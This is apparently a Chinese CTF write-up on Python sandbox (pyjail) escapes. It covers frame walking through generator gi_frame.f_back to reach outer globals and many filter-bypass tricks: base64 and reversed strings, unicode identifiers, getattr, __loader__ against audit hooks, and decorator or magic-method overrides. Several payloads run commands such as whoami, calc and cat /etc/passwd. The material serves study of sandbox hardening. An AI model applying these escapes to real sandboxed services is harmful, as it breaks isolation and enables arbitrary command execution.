<p>gi_frame 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息</p>
<p>举例使用gi_frame获取当前帧的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def my_generator():</span><br><span class="line">    yield 1</span><br><span class="line">    yield 2</span><br><span class="line">    yield 3</span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"># 获取生成器的当前帧信息</span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"></span><br><span class="line"># 输出生成器的当前帧信息</span><br><span class="line">print(&quot;Local Variables:&quot;, frame.f_locals)</span><br><span class="line">print(&quot;Global Variables:&quot;, frame.f_globals)</span><br><span class="line">print(&quot;Code Object:&quot;, frame.f_code)</span><br><span class="line">print(&quot;Instruction Pointer:&quot;, frame.f_lasti)</span><br></pre></td></tr></table></figure>

<h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>栈帧的几个重要属性</p>
<p>f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br>f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br>f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br>f_lasti: 整数，表示最后执行的字节码指令的索引。<br>f_back: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
<p>每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧 ！！！！！</p>
<h4 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h4><p>原理就是生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s3cret=&quot;this is flag&quot;</span><br><span class="line"></span><br><span class="line">codes=&#x27;&#x27;&#x27;</span><br><span class="line">def waff():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  #生成器</span><br><span class="line"></span><br><span class="line">    frame = next(g) #获取到生成器的栈帧对象  </span><br><span class="line">    # frame = [x for x in g][0] #由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象 </span><br><span class="line">    </span><br><span class="line">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span><br><span class="line">    return b</span><br><span class="line">b=waff()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">locals=&#123;&#125;</span><br><span class="line">code = compile(codes, &quot;test&quot;, &quot;exec&quot;)</span><br><span class="line">exec(code,locals)</span><br><span class="line">print(locals[&quot;b&quot;])</span><br></pre></td></tr></table></figure>

<p>代码说明：<br>1.使用next获取到的就是yield定义的值，这里获取到的就是g.gi_frame.f_back<br>2.使用g.gi_frame.f_back的话，那么g &#x3D; f()就必须为g，用的就是这个生成器对象的栈帧<br>3.compile(codes, “test”, “exec”)就是设置了名称为test的python沙箱环境</p>
<p>小改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s3cret=&quot;this is flag&quot;</span><br><span class="line"></span><br><span class="line">codes=&#x27;&#x27;&#x27;</span><br><span class="line">def waff():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()              #生成器</span><br><span class="line"></span><br><span class="line">    frame = next(g)     #获取到生成器的栈帧对象</span><br><span class="line">    print(frame)</span><br><span class="line">    print(frame.f_back)</span><br><span class="line">    print(frame.f_back.f_back)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">waff()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">locals=&#123;&#125;</span><br><span class="line">code = compile(codes, &quot;test&quot;, &quot;exec&quot;)</span><br><span class="line">exec(code,locals)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/06/pyjail/1.png" alt="alt text"></p>
<p>栈帧顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f  -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(1.py)</span><br></pre></td></tr></table></figure>
<p>成功逃逸</p>
<p>获取到外部的栈帧，就可以用f_globals去获取沙箱外的全局变量了</p>
<h4 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h4><p>但是yield g.gi_frame.f_back并不能修改为yield g.gi_frame</p>
<p>这样获取到的栈帧经过f_back后获得的是None</p>
<p>要是再来一个f_back就会报错</p>
<p><img src="/2025/04/06/pyjail/2.png" alt="alt text"></p>
<p>就记住吧，在生成器函数内部直接访问</p>
<h3 id="栈帧-粗略版"><a href="#栈帧-粗略版" class="headerlink" title="栈帧(粗略版)"></a>栈帧(粗略版)</h3><p>生成器<br>通过生成器获取全局栈帧<br>gi_code: 生成器对应的code对象。<br>gi_frame: 生成器对应的frame（栈帧）对象。<br>gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br>gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br>gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。</p>
<p>每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。</p>
<p>栈帧包含了以下几个重要的属性：<br>f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br>f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br>f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br>f_lasti: 整数，表示最后执行的字节码指令的索引。<br>f_back: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
<p>通过f_back获取上一帧的变量从而逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sig:=help.__call__.__globals__[&quot;sys&quot;].modules[&quot;_signal&quot;],sig.signal(2, lambda *x: print(x[1])), sig.raise_signal(2))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a=[x for x in a][0]</span><br><span class="line">globals=a.f_back.f_back.f_globals</span><br></pre></td></tr></table></figure>

<p>异步函数<br>通过异步函数获取该函数的局部栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">async def a():pass</span><br><span class="line">a().cr_frame.f_globals</span><br></pre></td></tr></table></figure>

<p>signal</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sig:=help.__call__.__globals__[&quot;sys&quot;].modules[&quot;_signal&quot;],sig.signal(2, lambda *x: print(x[1])), sig.raise_signal(2))</span><br></pre></td></tr></table></figure>

<h2 id="字符串匹配"><a href="#字符串匹配" class="headerlink" title="字符串匹配"></a>字符串匹配</h2><h3 id="base64变形"><a href="#base64变形" class="headerlink" title="base64变形"></a>base64变形</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&#x27;__import__&#x27;)</span><br><span class="line">&#x27;X19pbXBvcnRfXw==&#x27;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&#x27;os&#x27;)</span><br><span class="line">&#x27;b3M=&#x27;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;)](&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;calc&#x27;)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h3 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a>逆序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])</span><br><span class="line">kali</span><br><span class="line">&gt;&gt;&gt; exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br><span class="line">kali</span><br></pre></td></tr></table></figure>

<h3 id="list-dict"><a href="#list-dict" class="headerlink" title="list+dict"></a>list+dict</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])]</span><br><span class="line">__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])])</span><br><span class="line">list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]</span><br><span class="line">list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]</span><br></pre></td></tr></table></figure>

<h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><p>Python 3 开始支持非ASCII字符的标识符。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(_＿name_＿)</span><br></pre></td></tr></table></figure>

<h3 id="过滤属性名"><a href="#过滤属性名" class="headerlink" title="过滤属性名"></a>过滤属性名</h3><p>getattr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(object, name[, default])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(&#123;&#125;,&#x27;__class__&#x27;)</span><br><span class="line">&lt;class &#x27;dict&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)</span><br><span class="line">&lt;built-in function system&gt;</span><br><span class="line">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">&gt;&gt;&gt; getattr(os,&#x27;system111&#x27;,os.system)(&#x27;cat /etc/passwd&#x27;)</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh</span><br></pre></td></tr></table></figure>

<p>__getattribute__</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyClass:</span><br><span class="line">    def __getattribute__(self, name):</span><br></pre></td></tr></table></figure>
<p>getattr 函数在调用时，实际上就是调用这个类的 __getattribute__方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.__getattribute__</span><br><span class="line">&lt;method-wrapper &#x27;__getattribute__&#x27; of module object at 0x7f06a9bf44f0&gt;</span><br><span class="line">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)</span><br><span class="line">&lt;built-in function system&gt;</span><br></pre></td></tr></table></figure>

<p>__getattr__</p>
<p>__getattr__是 Python 的一个魔术方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 AttributeError异常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class MyClass:</span><br><span class="line">    def __getattr__(self, name):</span><br><span class="line">        return &#x27;You tried to get &#x27; + name</span><br></pre></td></tr></table></figure>

<h3 id="globals-1"><a href="#globals-1" class="headerlink" title="__globals__"></a>__globals__</h3><p>__globals__可以用 func_globals 直接替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&quot;__glo&quot;+&quot;bals__&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="基类"><a href="#基类" class="headerlink" title="基类"></a>基类</h3><p>__mro__、__bases__、__base__互换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure>

<h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>__import__<br>除了可以使用 import，还可以使用 __import__和 importlib.import_module来导入模块<br>importlib 需要进行导入后才能够使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;)</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>__loader__<br>__loader__.load_module底层实现与 import 不同, 可以绕过audithook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(&#x27;os&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title="[]"></a>[]</h3><p>调用方法来获取属性</p>
<p>列表方法<br>__getitem__<br>pop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list.__getitem__(0)</span><br><span class="line">list.pop(0)</span><br></pre></td></tr></table></figure>

<p>字典方法<br>__getitem__<br>pop<br>get<br>setdefault</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict.__getitem__(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.pop(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.get(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.setdefault(&#x27;__builtins__&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="‘’"><a href="#‘’" class="headerlink" title="‘’"></a>‘’</h3><p>str</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__new__</span><br><span class="line">&lt;built-in method __new__ of type object at 0x9597e0&gt;</span><br><span class="line">&gt;&gt;&gt; str(().__class__.__new__)</span><br><span class="line">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span><br><span class="line">&gt;&gt;&gt; str(().__class__.__new__)[21]</span><br><span class="line">&#x27;w&#x27;</span><br><span class="line">&gt;&gt;&gt; str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]</span><br><span class="line">&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>

<p>chr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; chr(56)</span><br><span class="line">&#x27;8&#x27;</span><br><span class="line">&gt;&gt;&gt; chr(100)</span><br><span class="line">&#x27;d&#x27;</span><br></pre></td></tr></table></figure>

<p>list dict</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(dict(whoami=1))[0]</span><br></pre></td></tr></table></figure>

<p>__doc__<br>__doc__变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(&#x27;s&#x27;)</span><br><span class="line">().__doc__[19]+().__doc__[86]+().__doc__[19]</span><br></pre></td></tr></table></figure>

<p>bytes<br>接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes([115, 121, 115, 116, 101, 109]).decode()</span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title="+"></a>+</h3><p>构造字符串还可以使用 join 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 __doc__中取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str().join(().__doc__[19],().__doc__[23])</span><br></pre></td></tr></table></figure>

<h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>返回值<br>使用一些函数的返回值获取</p>
<p>0：int(bool([]))、Flase、len([])、any(())<br>1：int(bool([“”]))、True、all(())、int(list(list(dict(a၁&#x3D;())).pop()).pop())</p>
<p>其他数字通过运算获取</p>
<p>repr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(repr(True))</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; len(repr(bytearray))</span><br><span class="line">19</span><br></pre></td></tr></table></figure>

<p>len list dict<br>避免出现运算符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; len([])</span><br><span class="line">2 -&gt; len(list(dict(aa=()))[len([])])</span><br><span class="line">3 -&gt; len(list(dict(aaa=()))[len([])])</span><br></pre></td></tr></table></figure>

<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>使用括号替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@print\r@set\r@open\r@input\rclass\x0ca:pass</span><br></pre></td></tr></table></figure>

<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>&#x3D;&#x3D; 可以用 in 来替换<br>or 可以用| + -a-b来替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:</span><br><span class="line">    ans = i[0]==i[1] or i[2]==i[3]</span><br><span class="line">    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; | &#123;i[2]==i[3]&#125;&#x27;)) == ans)</span><br><span class="line">    print(bool(eval(f&#x27;- &#123;i[0]==i[1]&#125; - &#123;i[2]==i[3]&#125;&#x27;)) == ans)</span><br><span class="line">    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; + &#123;i[2]==i[3]&#125;&#x27;)) == ans)</span><br></pre></td></tr></table></figure>

<p>and 可以用&amp; *替代</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:</span><br><span class="line">    ans = i[0]==i[1] and i[2]==i[3]</span><br><span class="line">    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; &amp; &#123;i[2]==i[3]&#125;&#x27;)) == ans)</span><br><span class="line">    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; * &#123;i[2]==i[3]&#125;&#x27;)) == ans)</span><br></pre></td></tr></table></figure>

<h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>装饰器<br>@</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">def a():pass # or class a:pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@print</span><br><span class="line">@set</span><br><span class="line">@open</span><br><span class="line">@input</span><br><span class="line">def a():pass # or class a:pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@print\r@set\r@open\r@input\rclass\x0ca:pass</span><br></pre></td></tr></table></figure>

<p>魔术方法<br>enum.EnumMeta.__getitem__</p>
<h3 id="过滤括号调用函数"><a href="#过滤括号调用函数" class="headerlink" title="过滤括号调用函数"></a>过滤括号调用函数</h3><p>通过覆盖魔法方法调用函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">help.__class__.__getattribute__ = system</span><br><span class="line">help.calc</span><br></pre></td></tr></table></figure>

<p>在__builtins__中，类似、可操作的对象还有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">quit</span><br><span class="line">license</span><br><span class="line">exit</span><br><span class="line">credits</span><br><span class="line">copyright</span><br></pre></td></tr></table></figure>

<p>通常为了执行命令，最好是覆盖为只有一个参数并且方便可控的魔法方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">help.__class__.__delattr__ = system</span><br><span class="line">del help.calc</span><br><span class="line">help.__class__.__eq__ = system</span><br><span class="line">help == &quot;calc&quot;</span><br><span class="line">help.__class__.__ge__ = system</span><br><span class="line">help &gt;= &quot;calc&quot;</span><br><span class="line">help.__class__.__gt__ = system</span><br><span class="line">help &gt; &quot;calc&quot;</span><br><span class="line">help.__class__.__le__ = system</span><br><span class="line">help &lt;= &quot;calc&quot;</span><br><span class="line">help.__class__.__lt__ = system</span><br><span class="line">help &lt; &quot;calc&quot;</span><br><span class="line">help.__class__.__ne__ = system</span><br><span class="line">help != &quot;calc&quot;</span><br><span class="line">help.__class__.__getattribute__ = system</span><br><span class="line">help.calc</span><br></pre></td></tr></table></figure>

<h3 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="builtins函数"><a href="#builtins函数" class="headerlink" title="builtins函数"></a>builtins函数</h3><p>eval list dict</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#x27;str&#x27;)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; eval(&#x27;bool&#x27;)</span><br><span class="line">&lt;class &#x27;bool&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; eval(&#x27;st&#x27;+&#x27;r&#x27;)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; eval(list(dict(s_t_r=1))[0][::2])</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="点号和逗号"><a href="#点号和逗号" class="headerlink" title="点号和逗号"></a>点号和逗号</h3><p>内建函数可以使用eval(list(dict(s_t_r&#x3D;1))[0][::2])这样的方式获取。</p>
<p>模块内的函数可以先使用 __import__导入函数，然后使用 vars() 进行获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; vars(__import__(&#x27;binascii&#x27;))[&#x27;a2b_base64&#x27;]</span><br><span class="line">&lt;built-in function a2b_base64&gt;</span><br></pre></td></tr></table></figure>

<h2 id="命名空间限制"><a href="#命名空间限制" class="headerlink" title="命名空间限制"></a>命名空间限制</h2><p>python交互式解析器不能指定命名空间,可以脚本模拟</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def repl():</span><br><span class="line">    global_namespace = &#123;&#125;</span><br><span class="line">    local_namespace = &#123;&#125;</span><br><span class="line"></span><br><span 